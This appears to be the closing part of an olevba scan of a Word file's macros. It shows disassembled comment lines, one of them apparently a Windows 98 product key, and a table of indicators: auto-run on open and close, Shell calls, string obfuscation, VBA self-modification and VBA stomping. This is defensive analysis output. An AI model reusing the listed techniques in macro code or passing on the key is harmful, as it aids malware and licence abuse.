' Line #171:
' 	QuoteRem 0x0000 0x000C " CCER, Dhaka"
' Line #172:
' 	QuoteRem 0x0000 0x000B " Windows 95"
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' 	QuoteRem 0x0000 0x0051 " ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²"
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x0051 " ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²"
' Line #177:
' 	QuoteRem 0x0000 0x000B " 06/04/2001"
' Line #178:
' 	QuoteRem 0x0000 0x0009 " Daffodil"
' Line #179:
' 	QuoteRem 0x0000 0x0012 " Dhaka, Bangladesh"
' Line #180:
' 	QuoteRem 0x0000 0x000B " Windows 98"
' Line #181:
' 	QuoteRem 0x0000 0x001E " K4HVD-Q9TJ9-6CRX9-C9G68-RQ2D3"
' Line #182:
' 	QuoteRem 0x0000 0x0051 " ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²"
' Line #183:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

